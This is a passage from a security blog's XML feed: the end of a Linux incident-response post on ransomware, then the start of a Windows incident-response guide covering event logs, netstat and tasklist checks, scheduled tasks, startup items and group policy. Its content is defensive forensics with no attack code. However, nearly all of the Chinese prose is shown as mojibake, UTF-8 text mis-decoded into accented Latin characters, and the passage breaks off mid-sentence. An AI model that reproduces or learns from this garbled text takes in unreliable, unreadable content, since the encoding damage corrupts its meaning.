title="å‹’ç´¢ç—…æ¯’"></a>å‹’ç´¢ç—…æ¯’</h3><p>å¯¹äºä¸“ä¸šçš„å‹’ç´¢ç—…æ¯’ï¼Œæƒ³è¦é€šè¿‡è§£å¯†æ¢å¤æ•°æ®çš„å‡ ç‡æ¯”è¾ƒæ¸ºèŒ«ï¼Œå‰©ä¸‹çš„å°±æ˜¯å¦¥åä¸ä¸å¦¥åã€‚</p><h4 id="åŸºæœ¬æµç¨‹-1"><a href="#åŸºæœ¬æµç¨‹-1" class="headerlink" title="åŸºæœ¬æµç¨‹"></a>åŸºæœ¬æµç¨‹</h4><p>ä¸€æ—¦å‘ç°ç–‘ä¼¼ä¸­ç—…æ¯’ï¼Œæ— è®ºæ˜¯å¦ä¸ºå‹’ç´¢ç—…æ¯’é¦–å…ˆè¿˜æ˜¯å¾—å…ˆéš”ç¦»ä¸»æœºï¼Œç‰©ç†éš”ç¦»æˆ–è€…èµ„æºéš”ç¦»å‡å¯ä»¥ï¼ŒæŠŠæŸå®³é™åˆ°æœ€ä½ã€‚æœ‰å¤‡ä»½æ¸…é™¤ç—…æ¯’åé‡æ–°æ‹‰å–å°±ç³»ï¼Œæ²¡æœ‰å¤‡ä»½é‚£å°±â€¦â€¦</p><p>è§£å¯†å¹³å°</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 360</span><br><span class="line">https://lesuobingdu.360.cn/</span><br></pre></td></tr></table></figure></div><h2 id="å…­ã€å‚è€ƒ"><a href="#å…­ã€å‚è€ƒ" class="headerlink" title="å…­ã€å‚è€ƒ"></a>å…­ã€å‚è€ƒ</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/wpsec/Emergency-response-notes/blob/main/Linux-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94.md</span><br><span class="line">https://blog.csdn.net/qq_44874645/article/details/118459837</span><br><span class="line">https://mp.weixin.qq.com/s/iQSEvvLtpW_39UoymliYPA</span><br><span class="line">https://mp.weixin.qq.com/s/eGaQDLVo9yn3fIPFN2bH6w</span><br><span class="line">https://mp.weixin.qq.com/s/x6XKzXsnaY6bg_kZn_O3oA</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> åº”æ€¥å“åº”ç³»åˆ— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux åº”æ€¥å“åº” </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows åº”æ€¥å“åº”ï¼šæ€è·¯æ¢ç´¢ä¸æ¡ˆä¾‹å®è·µ</title>
      <link href="/2023/10/22/Windows%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%EF%BC%9A%E6%80%9D%E8%B7%AF%E6%8E%A2%E7%B4%A2%E4%B8%8E%E6%A1%88%E4%BE%8B%E5%AE%9E%E8%B7%B5/"/>
      <url>/2023/10/22/Windows%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%EF%BC%9A%E6%80%9D%E8%B7%AF%E6%8E%A2%E7%B4%A2%E4%B8%8E%E6%A1%88%E4%BE%8B%E5%AE%9E%E8%B7%B5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>åº”æ€¥å“åº”ï¼ˆemergency responseï¼‰å¹¿ä¹‰ä¸ŠæŒ‡åœ¨å‡ºç°ç´§æ€¥æƒ…å†µæˆ–çªå‘äº‹ä»¶æ—¶ï¼Œè¿…é€Ÿé‡‡å–è¡ŒåŠ¨ä»¥å‡å°‘æŸå¤±ã€ä¿æŠ¤äººå‘˜å®‰å…¨å’Œæ¢å¤æ­£å¸¸è¿è¥çš„è¿‡ç¨‹ã€‚ç›¸å¯¹äºç½‘ç»œå®‰å…¨è¡Œä¸šæ¥è¯´ç‰¹æŒ‡ç³»ç»Ÿæˆ–ç½‘ç»œé­é‡éæ³•å…¥ä¾µã€ç—…æ¯’å…¥ä¾µã€æ¶æ„æ”»å‡»ç­‰éæ³•çš„å®‰å…¨å…¥ä¾µåè€Œå¯åŠ¨çš„å®‰å…¨æ’æŸ¥å¹¶æ¢å¤æ­£å¸¸è¿è¡Œã€‚æœ¬æ–‡åŸºäºWindwos å¹³å°çš„å®‰å…¨åº”æ€¥å“åº”ï¼Œç»“åˆç›¸å…³å®‰å…¨æ¡ˆä¾‹ç®€å•é˜è¿° Windows ç½‘ç»œå®‰å…¨åº”æ€¥å“åº”å·¥ä½œçš„å¼€å±•ã€‚</p><h2 id="äºŒã€åŸºç¡€çŸ¥è¯†"><a href="#äºŒã€åŸºç¡€çŸ¥è¯†" class="headerlink" title="äºŒã€åŸºç¡€çŸ¥è¯†"></a>äºŒã€åŸºç¡€çŸ¥è¯†</h2><p>å¯¹äº Windows ç³»ç»Ÿçš„åº”æ€¥å“åº”ï¼Œåº”éœ€äº†è§£ç›¸åº”çš„ç³»ç»ŸçŸ¥è¯†ï¼Œä¸€å®šçŸ¥è¯†çš„ç§¯ç´¯å¯ä»¥å¸®åŠ©åº”æ€¥äººå‘˜åœ¨åº”æ€¥å“åº”æ—¶å¿«é€Ÿä½œå‡ºåˆ¤æ–­ï¼Œä¾¿äºå·¥ä½œçš„å¼€å±•ï¼Œä»¥ä¸‹ä¸ºéƒ¨åˆ†çš„ Windwos ç³»ç»ŸåŸºç¡€çŸ¥è¯†ã€‚</p><h3 id="2-1-ç³»ç»Ÿæ—¥å¿—"><a href="#2-1-ç³»ç»Ÿæ—¥å¿—" class="headerlink" title="2.1 ç³»ç»Ÿæ—¥å¿—"></a>2.1 ç³»ç»Ÿæ—¥å¿—</h3><p>åœ¨Windows åº”æ€¥å“åº”ä¸­ï¼Œä¸»è¦åˆ†æçš„æ—¥å¿—æ—¥å¿—ç±»å‹æœ‰ï¼š<strong>ç³»ç»Ÿæ—¥å¿—ã€å®‰å…¨æ—¥å¿—ã€åº”ç”¨ç¨‹åºæ—¥å¿—</strong>ï¼Œå¿«æ·é”® <code>Win + R</code>  åœ¨è¿è¡Œæ¡†è¾“å…¥ <code>eventvwr.msc</code> å³å¯æ‰“å¼€äº‹ä»¶æŸ¥çœ‹å™¨ï¼Œå¯¹åº”ç»å¯¹è·¯å¾„ä¸º <code>C:\Windows\System32\winevt\Logs</code> ä¸‹çš„ <code>System.evtx</code>ã€<code>Security.evtx</code>ã€<code>Application.evtx</code></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231024205652587.png" data-caption="image-20231024205652587"><img src="/../images/emergency/windows/image-20231024205652587.png" alt="image-20231024205652587"></a></p><blockquote><p>ç³»ç»Ÿæ—¥å¿—</p></blockquote><p>ç³»ç»Ÿæ—¥å¿—ä¸»è¦è®°å½•æ“ä½œç³»ç»Ÿç»„ä»¶äº§ç”Ÿçš„äº‹ä»¶ï¼Œä¸»è¦åŒ…æ‹¬é©±åŠ¨ç¨‹åºã€ç³»ç»Ÿç»„ä»¶å’Œåº”ç”¨è½¯ä»¶çš„å´©æºƒä»¥åŠæ•°æ®ä¸¢å¤±é”™è¯¯ç­‰ã€‚é»˜è®¤ä½ç½®ï¼š<code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231020145804377-169833198664826.png" data-caption="image-20231020145804377"><img src="/../images/emergency/windows/image-20231020145804377-169833198664826.png" alt="image-20231020145804377"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231020150309096.png" data-caption="image-20231020150309096"><img src="/../images/emergency/windows/image-20231020150309096.png" alt="image-20231020150309096"></a></p><blockquote><p>å®‰å…¨æ—¥å¿—</p></blockquote><p>å®‰å…¨æ—¥å¿—è®°å½•ç³»ç»Ÿçš„å®‰å…¨å®¡è®¡äº‹ä»¶ï¼ŒåŒ…å«å„ç§ç±»å‹çš„ç™»å½•æ—¥å¿—ã€å¯¹è±¡è®¿é—®æ—¥å¿—ã€è¿›ç¨‹è¿½è¸ªæ—¥å¿—ã€ç‰¹æƒä½¿ç”¨ã€å¸å·ç®¡ç†ã€ç­–ç•¥å˜æ›´ã€ç³»ç»Ÿäº‹ä»¶ã€‚ å®‰å…¨æ—¥å¿—ä¹Ÿæ˜¯è°ƒæŸ¥å–è¯ä¸­æœ€å¸¸ç”¨åˆ°çš„æ—¥å¿—ã€‚ é»˜è®¤è®¾ç½®ä¸‹ï¼Œå®‰å…¨æ€§æ—¥å¿—æ˜¯å…³é—­çš„ï¼Œç®¡ç†å‘˜å¯ä»¥ä½¿ç”¨ç»„ç­–ç•¥æ¥å¯åŠ¨å®‰å…¨æ€§æ—¥å¿— æˆ–è€…åœ¨æ³¨å†Œè¡¨ä¸­è®¾ç½®å®¡æ ¸ç­–ç•¥ï¼Œä»¥ä¾¿å½“å®‰å…¨æ€§æ—¥å¿—æ»¡åä½¿ç³»ç»Ÿåœæ­¢å“åº”ã€‚ é»˜è®¤ä½ç½®ï¼š<code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231020150447266-169833205416728.png" data-caption="image-20231020150447266"><img src="/../images/emergency/windows/image-20231020150447266-169833205416728.png" alt="image-20231020150447266"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231020150528616.png" data-caption="image-20231020150528616"><img src="/../images/emergency/windows/image-20231020150528616.png" alt="image-20231020150528616"></a></p><blockquote><p>åº”ç”¨ç¨‹åºæ—¥å¿—</p></blockquote><p>åŒ…å«ç”±åº”ç”¨ç¨‹åºæˆ–ç³»ç»Ÿç¨‹åºè®°å½•çš„äº‹ä»¶ï¼Œä¸»è¦è®°å½•ç¨‹åºè¿è¡Œæ–¹é¢çš„äº‹ä»¶ ä¾‹å¦‚æ•°æ®åº“ç¨‹åºå¯ä»¥åœ¨åº”ç”¨ç¨‹åºæ—¥å¿—ä¸­è®°å½•æ–‡ä»¶é”™è¯¯ï¼Œç¨‹åºå¼€å‘äººå‘˜å¯ä»¥è‡ªè¡Œå†³å®šç›‘è§†å“ªäº›äº‹ä»¶ã€‚ å¦‚æœæŸä¸ªåº”ç”¨ç¨‹åºå‡ºç°å´©æºƒæƒ…å†µï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä»ç¨‹åºäº‹ä»¶æ—¥å¿—ä¸­æ‰¾åˆ°ç›¸åº”çš„è®°å½•ï¼Œä¹Ÿè®¸ä¼šæœ‰åŠ©äºä½ è§£å†³é—®é¢˜ã€‚ é»˜è®¤ä½ç½®ï¼š<code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231020150345859-169833211539730.png" data-caption="image-20231020150345859"><img src="/../images/emergency/windows/image-20231020150345859-169833211539730.png" alt="image-20231020150345859"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231020150412625.png" data-caption="image-20231020150412625"><img src="/../images/emergency/windows/image-20231020150412625.png" alt="image-20231020150412625"></a></p><blockquote><p>PowerShellæ—¥å¿—</p></blockquote><p>ç”¨æˆ·åœ¨æ‰§è¡Œ PowerShell å‘½ä»¤æˆ–è„šæœ¬æ—¶ï¼Œæ— è®ºæ˜¯æœ¬åœ°è¿˜æ˜¯é€šè¿‡è¿œç¨‹å¤„ç†ï¼ŒWindowséƒ½ä¼šå°†äº‹ä»¶å†™å…¥ä»¥ä¸‹ä¸‰ä¸ªæ—¥å¿—æ–‡ä»¶ã€‚é»˜è®¤ä½ç½®</p><p><code>C:\Windows\System32\winevt\Logs</code></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Windows PowerShell.evtx</span><br><span class="line">Microsoft-Windows-PowerShell/Operational.evtx</span><br><span class="line">Microsoft-Windows-PowerShell/Analytic.etl(è¯¥åˆ†ææ—¥å¿—å¿…é¡»å¼€å¯æ‰èƒ½æ•è·äº‹ä»¶)</span><br></pre></td></tr></table></figure></div><h3 id="2-2-è¿›ç¨‹"><a href="#2-2-è¿›ç¨‹" class="headerlink" title="2.2 è¿›ç¨‹"></a>2.2 è¿›ç¨‹</h3><p>Windows è¿›ç¨‹æ˜¯åœ¨ Windows æ“ä½œç³»ç»Ÿä¸­è¿è¡Œçš„ç¨‹åºå®ä¾‹ã€‚æ¯ä¸ªè¿›ç¨‹éƒ½æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„æ‰§è¡Œç¯å¢ƒï¼Œæ‹¥æœ‰è‡ªå·±çš„å†…å­˜ç©ºé—´å’Œç³»ç»Ÿèµ„æºã€‚è¿›ç¨‹ä¹‹é—´ç›¸äº’éš”ç¦»ï¼Œè¿™æ ·å¯ä»¥ç¡®ä¿ä¸€ä¸ªè¿›ç¨‹çš„å´©æºƒæˆ–é”™è¯¯ä¸ä¼šå½±å“å…¶ä»–è¿›ç¨‹çš„ç¨³å®šæ€§ã€‚åœ¨Windowsä¸­ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„æ ‡è¯†ç¬¦ï¼Œç§°ä¸ºè¿›ç¨‹IDï¼ˆProcess IDï¼ŒPIDï¼‰ï¼Œè¿›ç¨‹IDç”¨äºè¯†åˆ«å’Œç®¡ç†è¿›ç¨‹ã€‚Windows æ“ä½œç³»ç»Ÿä½¿ç”¨è¿›ç¨‹è°ƒåº¦ç®—æ³•æ¥å†³å®šå“ªäº›è¿›ç¨‹åœ¨ç»™å®šæ—¶é—´è¿è¡Œï¼Œä»¥åŠå®ƒä»¬åœ¨å¤„ç†å™¨ä¸Šåˆ†é…çš„æ—¶é—´ã€‚åº•éƒ¨ä»»åŠ¡æ å³é”®ç‚¹å‡»ä»»åŠ¡ç®¡ç†å™¨å³å¯æ‰“å¼€</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231024205833532.png" data-caption="image-20231024205833532"><img src="/../images/emergency/windows/image-20231024205833532.png" alt="image-20231024205833532"></a></p><p>äº¦å¯é€šè¿‡ <code>Win + R</code> è¾“å…¥ <code>msinfo32</code> <strong>ç³»ç»Ÿç¯å¢ƒ-ã€‹æ­£åœ¨è¿è¡Œä»»åŠ¡</strong> æŸ¥çœ‹æ›´ä¸ºè¯¦ç»†çš„è¿›ç¨‹ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¿›ç¨‹è·¯å¾„ã€è¿›ç¨‹IDã€æ–‡ä»¶åˆ›å»ºæ—¥æœŸä»¥åŠå¯åŠ¨æ—¶é—´ç­‰ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231025093811569.png" data-caption="image-20231025093811569"><img src="/../images/emergency/windows/image-20231025093811569.png" alt="image-20231025093811569"></a></p><p>ç»ˆç«¯å‘½ä»¤ä¸ºï¼š<code>netstat -ano</code></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231024210046739.png" data-caption="image-20231024210046739"><img src="/../images/emergency/windows/image-20231024210046739.png" alt="image-20231024210046739"></a></p><h3 id="2-3-è®¡åˆ’ä»»åŠ¡"><a href="#2-3-è®¡åˆ’ä»»åŠ¡" class="headerlink" title="2.3 è®¡åˆ’ä»»åŠ¡"></a>2.3 è®¡åˆ’ä»»åŠ¡</h3><p>Windows è®¡åˆ’ä»»åŠ¡æ˜¯ä¸€ç§åŠŸèƒ½ï¼Œç”¨äºåœ¨æŒ‡å®šçš„æ—¶é—´æˆ–äº‹ä»¶å‘ç”Ÿæ—¶è‡ªåŠ¨æ‰§è¡Œç‰¹å®šçš„ä»»åŠ¡æˆ–ç¨‹åºã€‚<code>Win + R</code> è¾“å…¥<code>taskschd.msc</code></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231024210240754.png" data-caption="image-20231024210240754"><img src="/../images/emergency/windows/image-20231024210240754.png" alt="image-20231024210240754"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231020155248086.png" data-caption="image-20231020155248086"><img src="/../images/emergency/windows/image-20231020155248086.png" alt="image-20231020155248086"></a></p><h2 id="ä¸‰ã€å…¥ä¾µæ’æŸ¥æ€è·¯"><a href="#ä¸‰ã€å…¥ä¾µæ’æŸ¥æ€è·¯" class="headerlink" title="ä¸‰ã€å…¥ä¾µæ’æŸ¥æ€è·¯"></a>ä¸‰ã€å…¥ä¾µæ’æŸ¥æ€è·¯</h2><p>å½“åº”æ€¥äººå‘˜åœ¨æ¥åˆ°åº”æ€¥å“åº”ä»»åŠ¡åï¼Œé¦–å…ˆéœ€è¦å†·é™åˆ†æï¼Œå……åˆ†äº†è§£äº‹ä»¶è¯¦æƒ…ï¼Œç†æ¸…å…·ä½“åº”æ€¥äº‹ä»¶çš„ç±»å‹ï¼Œå› ä¸ºä¸åŒçš„ç±»å‹æ‰€å¯¹åº”çš„åº”æ€¥æ–¹æ¡ˆç•¥æœ‰å·®å¼‚ï¼›è¯¢é—®ç°åœºäººå‘˜å…·ä½“äº‹ä»¶çš„å‘ç”ŸåŠç ”åˆ¤è¿‡ç¨‹ï¼Œå†è€…è¯¢é—®æ˜¯å¦æœ‰å®‰å…¨è®¾å¤‡ï¼Œè‹¥æœ‰ï¼Œå¯é€šè¿‡å®‰å…¨å¹³å°é’ˆå¯¹åº”æ€¥äº‹ä»¶ç±»å‹æŸ¥çœ‹æ—¥å¿—è·å–æœ‰ç”¨ä¿¡æ¯ï¼Œè‹¥å·²æ•è·ç›¸å…³æ ·æœ¬åˆ™è¯·æ±‚æä¾›å¼€å±•åˆ†æã€‚ä»¥ä¸‹æ­¥éª¤ä¸»è¦ä¸ºé’ˆå¯¹æœåŠ¡å™¨ä¸»æœºç«¯çš„å…¥ä¾µæ’æŸ¥æ“ä½œï¼Œé¡ºåºä¸ä¸€å®šæŒ‰ç…§ä»¥ä¸‹æ¥ï¼Œæ ¹æ®ç°åœºç¯å¢ƒå’Œå¾—åˆ°çš„ä¿¡æ¯è¿›è¡Œçµæ´»å¤„ç†å³å¯ã€‚å¸¸è§æ”»å‡»æˆ–å®‰å…¨äº‹ä»¶æ‰‹æ®µå¦‚ä¸‹ï¼š</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| ç±»å‹     | æ‰‹æ®µ                          |</span><br><span class="line">| -------- | ----------------------------- |</span><br><span class="line">| Webå…¥ä¾µ  | ç½‘é¡µæŒ‚é©¬ã€ä¸»é¡µç¯¡æ”¹ã€Webshell  |</span><br><span class="line">| ç³»ç»Ÿå…¥ä¾µ | ç—…æ¯’æœ¨é©¬ã€å‹’ç´¢è½¯ä»¶ã€è¿œæ§åé—¨  |</span><br><span class="line">| ç½‘ç»œæ”»å‡» | DDOS æ”»å‡»ã€DNS åŠ«æŒã€ARP æ¬ºéª— |</span><br></pre></td></tr></table></figure></div><h3 id="3-1-æ£€æŸ¥ç³»ç»Ÿè´¦å·å®‰å…¨"><a href="#3-1-æ£€æŸ¥ç³»ç»Ÿè´¦å·å®‰å…¨" class="headerlink" title="3.1 æ£€æŸ¥ç³»ç»Ÿè´¦å·å®‰å…¨"></a>3.1 æ£€æŸ¥ç³»ç»Ÿè´¦å·å®‰å…¨</h3><p>1ã€æ’æŸ¥æ˜¯å¦æœ‰å¼‚å¸¸çš„ç³»ç»Ÿç”¨æˆ·</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lusrmgr.msc</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231024211318261.png" data-caption="image-20231024211318261"><img src="/../images/emergency/windows/image-20231024211318261.png" alt="image-20231024211318261"></a></p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231024211230840.png" data-caption="image-20231024211230840"><img src="/../images/emergency/windows/image-20231024211230840.png" alt="image-20231024211230840"></a></p><p>cmd ç»ˆç«¯å‘½ä»¤äº¦å¯è¿›è¡ŒæŸ¥è¯¢</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231024211545519.png" data-caption="image-20231024211545519"><img src="/../images/emergency/windows/image-20231024211545519.png" alt="image-20231024211545519"></a></p><p>2ã€æ’æŸ¥è´¦å·ä¿¡æ¯ï¼ˆæŒ‰ç…§å®é™…æƒ…å†µæŸ¥è¯¢ï¼‰ï¼Œè‹¥å‘ç°å­˜åœ¨å¯ç–‘è´¦å·å¯ç›´æ¥è¯¢é—®ç³»ç»Ÿæ–¹ç®¡ç†å‘˜ï¼Œå’¨è¯¢å…¶è´¦å·å½’å±ï¼Œä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹å¤„äºAdministrator ç»„çš„ç”¨æˆ·</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup Administrators</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231024212009667.png" data-caption="image-20231024212009667"><img src="/../images/emergency/windows/image-20231024212009667.png" alt="image-20231024212009667"></a></p><h3 id="3-2-æ£€æŸ¥å¯ç–‘è¿›ç¨‹ã€ç«¯å£"><a href="#3-2-æ£€æŸ¥å¯ç–‘è¿›ç¨‹ã€ç«¯å£" class="headerlink" title="3.2 æ£€æŸ¥å¯ç–‘è¿›ç¨‹ã€ç«¯å£"></a>3.2 æ£€æŸ¥å¯ç–‘è¿›ç¨‹ã€ç«¯å£</h3><p>1ã€è¿›ç¨‹ï¼Œé€šè¿‡å‘½ä»¤æŸ¥çœ‹ç›®å‰çš„ç½‘ç»œè¿æ¥ï¼Œå®šä½å¯ç–‘çš„ <code>ESTABLISHED</code> ,è‹¥ä¸»æœºå·²æ–­ç½‘ï¼Œåˆ™å¯æ³¨æ„å¤„äº <code>LISTENING</code>ï¼Œè¯¥æ­¥éª¤ä¸»è¦æ˜¯æ’æŸ¥å¯¹å¤– IP ä¸æœ¬æœºçš„è¿æ¥æƒ…å†µã€‚å¯¹å¯ç–‘çš„ IP è¿›è¡Œå®‰å…¨æ’æŸ¥ã€‚ </p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231025092732078.png" data-caption="image-20231025092732078"><img src="/../images/emergency/windows/image-20231025092732078.png" alt="image-20231025092732078"></a></p><p>å®šä½å¯ç–‘è·¯å¾„åº”ç”¨,è‹¥é€šè¿‡ netstat -ano å‘ç°å¯ç–‘é“¾æ¥æˆ–è¿›ç¨‹ï¼Œåˆ™å¯é€šè¿‡å®šä½å…¶ PID è¿›è€Œå®šä½å¯ç–‘åº”ç”¨ï¼Œä¸‹åˆ—é€šè¿‡å®šä½ä¸Šå›¾ <code>ESTABLISHED</code> å…·ä½“æ˜¯å“ªä¸ªåº”ç”¨ï¼Œä¸Šå›¾ PID ä¸º 852ï¼Œç”±ä¸‹å›¾å¯çŸ¥å·²ç»å»ºç«‹è¿æ¥çš„åº”ç”¨ç¨‹åºä¸º chrome.exe </p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist  | findstr &quot;PID&quot;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231025092957892.png" data-caption="image-20231025092957892"><img src="/../images/emergency/windows/image-20231025092957892.png" alt="image-20231025092957892"></a></p><p>2ã€å½“ç„¶è¿™é‡Œåœ¨ä¸çŸ¥é“ PID çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡ç«¯å£è·å– PID è¿›è€Œå®šä½å…·ä½“åº”ç”¨ï¼Œæœ€å¤–å±‚çš„æ˜¯ PID å·ï¼Œå¾—çŸ¥ 3306 ç«¯å£ PID ä¸º 1072 , 443 ç«¯å£ PID å·ä¸º 852</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231025093336126.png" data-caption="image-20231025093336126"><img src="/../images/emergency/windows/image-20231025093336126.png" alt="image-20231025093336126"></a></p><h3 id="3-3-æ£€æµ‹å¯ç–‘è®¡åˆ’ä»»åŠ¡"><a href="#3-3-æ£€æµ‹å¯ç–‘è®¡åˆ’ä»»åŠ¡" class="headerlink" title="3.3 æ£€æµ‹å¯ç–‘è®¡åˆ’ä»»åŠ¡"></a>3.3 æ£€æµ‹å¯ç–‘è®¡åˆ’ä»»åŠ¡</h3><p>1ã€Win + R è¾“å…¥å‘½ä»¤åæŸ¥çœ‹æ˜¯å¦å­˜åœ¨å¯ç–‘çš„è®¡åˆ’ä»»åŠ¡ï¼Œè‹¥å­˜åœ¨åˆ™å¯¹å…¶å¼€å±•å®‰å…¨æ’æŸ¥</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">taskschd.msc</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231025094824878.png" data-caption="image-20231025094824878"><img src="/../images/emergency/windows/image-20231025094824878.png" alt="image-20231025094824878"></a></p><p>2ã€é€šè¿‡æ£€æŸ¥è®¡ç®—æœºä¸ç½‘ç»œä¸Šçš„å…¶å®ƒè®¡ç®—æœºä¹‹é—´çš„ä¼šè¯æˆ–è®¡åˆ’ä»»åŠ¡æ’æŸ¥å®‰å…¨éšæ‚£,é€šè¿‡å¯¹æ˜¾ç¤ºçš„å¯ç–‘ä»»åŠ¡è¿›è¡Œå®¡æŸ¥</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- æ—§ç³»ç»Ÿä½¿ç”¨ at</span><br><span class="line">at</span><br><span class="line"></span><br><span class="line">- è¾ƒæ–°ç³»ç»Ÿè¾“å…¥</span><br><span class="line">schtasks.exe</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231025094612546.png" data-caption="image-20231025094612546"><img src="/../images/emergency/windows/image-20231025094612546.png" alt="image-20231025094612546"></a></p><h3 id="3-4-æ£€æŸ¥å¯ç–‘å¯åŠ¨é¡¹"><a href="#3-4-æ£€æŸ¥å¯ç–‘å¯åŠ¨é¡¹" class="headerlink" title="3.4 æ£€æŸ¥å¯ç–‘å¯åŠ¨é¡¹"></a>3.4 æ£€æŸ¥å¯ç–‘å¯åŠ¨é¡¹</h3><p>é€šè¿‡æŸ¥çœ‹æ˜¯å¦å­˜åœ¨å‘½åå¼‚å¸¸çš„å¯åŠ¨é¡¹ç›®ï¼Œè‹¥å­˜åœ¨åˆ™å–æ¶ˆå‹¾é€‰å‘½åå¼‚å¸¸çš„å¯åŠ¨é¡¹ç›®ï¼Œå¹¶æ‰¾åˆ°ç›¸å…³æ–‡ä»¶è·¯å¾„ä¿å­˜æ ·æœ¬åå¯ä½œåˆ é™¤å¤„ç†ã€‚</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msconfig</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231027094540269.png" data-caption="image-20231027094540269"><img src="/../images/emergency/windows/image-20231027094540269.png" alt="image-20231027094540269"></a></p><p>2ã€æ£€æŸ¥ç»„ç­–ç•¥ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰å¯ç–‘å¯åŠ¨ç­–ç•¥</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpedit.msc</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231025100017942.png" data-caption="image-20231025100017942"><img src="/../images/emergency/windows/image-20231025100017942.png" alt="image-20231025100017942"></a></p><p>3ã€æ£€æŸ¥æ³¨å†Œè¡¨,Win + R è¾“å…¥ regedit 